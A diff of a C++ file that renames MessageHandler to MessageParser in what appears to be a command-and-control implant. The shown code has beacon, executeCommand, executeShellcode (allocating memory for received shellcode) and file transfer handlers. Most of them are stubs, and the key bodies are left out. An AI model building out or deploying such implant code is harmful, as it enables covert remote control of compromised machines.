@@ -1,7 +1,7 @@
-/* MessageHandler.cpp */
+/* MessageParser.cpp */
 
 #include "C2Profile.h"
-#include "MessageHandler.h"
+#include "MessageParser.h"
 #include "MessageTypes.h"
 #include "MessagePublisher.h"
 #include "Recon.h"
@@ -17,19 +17,19 @@
 
 
 /*
-MessageHandler::MessageHandler()
+MessageParser::MessageParser()
 	: transportLayer_(nullptr)
 {
 	// debug statement
 }*/
 
 /*
-MessageHandler::MessageHandler(TransportLayer* transportLayer) :
+MessageParser::MessageParser(TransportLayer* transportLayer) :
 	transportLayer_(transportLayer)
 {
 }*/
 
-MessageHandler::MessageHandler(
+MessageParser::MessageParser(
 	TransportLayer* transportLayer, 
 	Serializer* serializer, 
 	Encoder* encoder)
@@ -40,27 +40,27 @@ MessageHandler::MessageHandler(
 {
 }
 
-MessageHandler::~MessageHandler()
+MessageParser::~MessageParser()
 {
 	// debug statement
 }
 
-void MessageHandler::start()
+void MessageParser::start()
 {
 	transportLayer_->beacon();
 }
 
-void MessageHandler::handle(const RawByteBuffer& data) // TODO: change rawbytebuffer to const? 
+void MessageParser::handle(const RawByteBuffer& data) // TODO: change rawbytebuffer to const? 
 {
-	std::cout << "MessageHandler::handle(RawByteBuffer)" << std::endl;
+	std::cout << "MessageParser::handle(RawByteBuffer)" << std::endl;
 }
 
-void MessageHandler::handle(const InternalMessage& msg)
+void MessageParser::handle(const InternalMessage& msg)
 {
-	std::cout << "MessageHandler::handle(InternalMessage)" << std::endl;
+	std::cout << "MessageParser::handle(InternalMessage)" << std::endl;
 }
 
-bool MessageHandler::executeCommand(RawByteBuffer& data)
+bool MessageParser::executeCommand(RawByteBuffer& data)
 {
 	std::cout << "executeCommand: " << byte2string(data).c_str() << std::endl;
 
@@ -112,7 +112,7 @@ bool MessageHandler::executeCommand(RawByteBuffer& data)
 	return sendResult;
 }
 
-bool MessageHandler::executeShellcode(InternalMessage& msg)
+bool MessageParser::executeShellcode(InternalMessage& msg)
 {
 	std::cout << "executeShellcode" << std::endl;
 	LPVOID shellMem = VirtualAlloc(0, msg.header.dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -157,7 +157,7 @@ bool MessageHandler::executeShellcode(InternalMessage& msg)
 
 
 /* NOTE: creating seperate process entirely
-bool MessageHandler::executeShellcode(InternalMessage& msg)
+bool MessageParser::executeShellcode(InternalMessage& msg)
 {
 	std::cout << "executeShellcode in separate process" << std::endl;
 
@@ -203,32 +203,32 @@ bool MessageHandler::executeShellcode(InternalMessage& msg)
 }*/
 
 
-bool MessageHandler::downloadFile(RawByteBuffer& data)
+bool MessageParser::downloadFile(RawByteBuffer& data)
 {
 	std::cout << "downloadFile" << std::endl;
 	return false;
 }
 
-bool MessageHandler::uploadFile(RawByteBuffer& data)
+bool MessageParser::uploadFile(RawByteBuffer& data)
 {
 	std::cout << "uploadFile" << std::endl;
 	return false;
 }
 
-bool MessageHandler::updateConfig(RawByteBuffer& data)
+bool MessageParser::updateConfig(RawByteBuffer& data)
 {
 	std::cout << "updateConfig" << std::endl;
 	return false;
 }
 
-bool MessageHandler::handleServerError(RawByteBuffer& data)
+bool MessageParser::handleServerError(RawByteBuffer& data)
 {
 	std::cout << "handleServerError" << std::endl;
 	return false;
 }
 
 
-// bool MessageHandler::systemInfo(InternalMessage& msg)
+// bool MessageParser::systemInfo(InternalMessage& msg)
 // {
 //     std::cout << "systemInfo" << std::endl;
 //     ReconMessage rMsg{};
@@ -328,7 +328,7 @@ bool MessageHandler::handleServerError(RawByteBuffer& data)
 // }
 
 // TODO: something about this function corruprts the memory
-void MessageHandler::processMessage(InternalMessage& msg)
+void MessageParser::processMessage(InternalMessage& msg)
 {
 	//systemInfo(msg);
 	switch (msg.header.messageType)
@@ -364,17 +364,17 @@ void MessageHandler::processMessage(InternalMessage& msg)
 }
 
 
-void MessageHandler::sendQueuedMessages()
+void MessageParser::sendQueuedMessages()
 {
 	std::cout << "sendQueuedMessages... not implemented" << std::endl;
 }
 
-RawByteBuffer MessageHandler::string2byte(std::string& inMsg)
+RawByteBuffer MessageParser::string2byte(std::string& inMsg)
 {
 	return RawByteBuffer(inMsg.begin(), inMsg.end());
 }
 
-std::string MessageHandler::byte2string(RawByteBuffer& inMsg)
+std::string MessageParser::byte2string(RawByteBuffer& inMsg)
 {
 	return std::string(inMsg.begin(), inMsg.end());
 }
